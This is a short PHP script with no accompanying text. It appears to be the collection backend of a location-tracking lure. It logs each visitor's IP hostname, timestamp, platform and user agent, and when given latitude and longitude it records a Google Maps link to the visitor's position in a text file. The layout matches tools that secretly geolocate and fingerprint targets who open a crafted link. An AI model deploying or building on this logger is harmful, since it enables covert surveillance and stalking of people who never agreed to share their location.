<?php
#$dirname = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
#$dirpath = "./upl_mak.2033_oad/" . $dirname . "/";
#if (!file_exists($dirpath)) {mkdir("./upl_mak.2033_oad/" . $dirname, 0777, true);};
#$file=$dirpath . "location.txt";
$file="location.txt";
$myfile = fopen($file, "a");
date_default_timezone_set("Asia/Amman");
if (!empty($_GET["lat"])) {$txt = "4. Location: ". "http://www.google.com/maps/place/" . $_GET["lat"] . "," . $_GET["long"] . "\n";}
else {$txt = "Date: " . date("Y/m/d h:i:sa l") . "\n1. IP: " . gethostbyaddr($_SERVER["REMOTE_ADDR"]) . "\n2. platform: " . $_GET["platform"] . "\n3. uagent: " . $_GET["uagent"] . "\n\n";}
fwrite($myfile, $txt);
fclose($myfile);
?>
